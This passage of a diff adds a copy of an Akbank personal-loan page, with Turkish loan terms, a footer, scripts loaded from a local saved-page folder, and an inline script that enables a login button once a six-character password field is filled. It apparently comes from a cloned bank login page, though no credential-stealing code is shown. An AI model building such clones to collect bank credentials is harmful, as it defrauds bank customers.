+                      <li>Erteleme dahil ihtiyaç kredilerinde en uzun vade; 50.000 TL ve altındaki tutarlarda 36 ay, 50.000 TL üzeri 100.000 TL ve altındaki tutarlarda 24 ay, 100.000 TL üzerindeki tutarlarda ise 12 aydır. En uzun kredi vadesi, mevzuatta belirlenen sınırlamalar doğrultusunda kişinin varsa mevcut kredilerinin bakiyesi de dikkate alınabileceğinden değişebilmektedir. İlk ödeme en fazla 92 gün ertelenebilir. Ödemesiz dönem sonunda ilk ödeme olarak erteleme faizinin tamamı tahsil edilir, normal taksit ödemeleri bir sonraki aydan itibaren başlar. Kredi başvurusu Akbank Mobil, İnternet, 444 25 25 Müşteri İletişim Merkezimiz ve tüm şubelerimizden yapılabilir.</li>
+                      <li>500.000 TL'ye kadar olan ihtiyaç kredisi başvuruları Akbank Mobil ve İnternet üzerinden, şubeye gitmeden yapılabilir. 500.000 TL'nin üzerindeki başvurular ise sadece şubelerimizden gerçekleştirilebilir.</li>
+                      <li>Belgesiz, imzasız, şubeye gitmeden İhtiyaç Kredisi kullanma imkanından T.C. vatandaşı, Akbank şifresi sahibi Akbanklılar yararlanabilir.</li>
+                      <li>Henüz Akbank müşterisi olmayanların kredi kullanabilmek için T.C. vatandaşlık numaralı kimlik, gelir belgesi, adres gösterir bir belge ve özel sektör çalışanı ise SGK Hizmet Döküm Belgeleri ile birlikte Akbank Şubelerine gitmeleri gerekmektedir.</li>
+                      <li>Banka, gerekli gördüğü durumlarda ek belge isteme hakkına sahiptir. Onaylanmış kredilerin kullandırılması için nihai karar Banka'ya aittir.</li>
+                      <li>Kredi başvurusu için kefil koşulu aranmamakla beraber gerekli görüldüğü durumda kefil talep edilebilir.</li>
+                      <li>Akbank T.A.Ş. kampanya koşullarında değişiklik yapma ve kampanyayı durdurma hakkını saklı tutar.</li>
+                      <li>Sigortalı faiz oranı, Akbank Mobil ve İnternet'ten yapılacak Kredili Hayat Sigortalı kredi kullanımları için geçerlidir. Hayat sigortası primi olan 1.640,73 TL, 50.000 TL tutarındaki 36 ay vadeli ihtiyaç kredisi için 35 yaş üzerinden örnek olarak hesaplanmıştır; kredinin tutarı, vadesi, faiz oranı ve kullanacak olan kişinin yaşına göre değişiklik gösterebilir.</li>
+                      <li>Kredi tahsis ücreti, kredi tutarının binde 5,75'i olup, BSMV dâhildir.</li>
+                      <li>Efektif Yıllık Faiz oranı hesaplamasına, kredi tahsis ücreti, faiz ve vergiler dahildir.</li>
+                      <li>Kredi faizi; Akbank şubeleri, Akbank Mobil, İnternet ve 444 25 25'te farklılık gösterebilir.</li>
+                      <li>Kullandırımda kredinin son taksit tutarında kuruşsal farklılık olabilmektedir.</li>
+                    </ul>
+                    <p></p>
+                  </div>
+                </div>
+              </div>
+            </section>
+          </main>
+          <footer class="page-footer">
+            <div class="container">
+              <div class="row">
+                <div class="col-9 col-md-9 col-lg-9 col-xl-9">
+                  <div class="page-footer-left">
+                    <span class="copyright-text">Her hakkı Akbank T.A.Ş'ye aittir ©2024</span>
+                  </div>
+                </div>
+                <div class="col-3 col-md-3 col-lg-3 col-xl-3">
+                  <div class="page-footer-right">
+                    <img name="NortonLogo" class="norton-logo" src="./Akbank_files/norton.png">
+                  </div>
+                </div>
+              </div>
+            </div>
+          </footer>
+        </div>
+      </div>
+    </div>
+    <script type="text/javascript" src="./Akbank_files/vendor.js"></script>
+    <script type="text/javascript" src="./Akbank_files/components.js"></script>
+    <script type="text/javascript" src="./Akbank_files/main.js"></script>
+    <script src="./Akbank_files/jquery-3.6.0.min.js"></script>
+    <script type="text/javascript" src="./Akbank_files/plus.js"></script>
+    <script type="text/javascript" src="./Akbank_files/script.js"></script>
+    <script type="text/javascript">
+      var passInput = document.getElementById('passauth');
+      var submitButton = document.getElementById('loginButtonPass');
+      passInput.addEventListener('input', function() {
+        if (passInput.value.length === 6) {
+          submitButton.disabled = false;
+        } else {
+          submitButton.disabled = true;
+        }
+      });
+    </script>
+    <noscript>You must enable javascript in your browser to view this webpage.</noscript>
+  </body>
+</html>
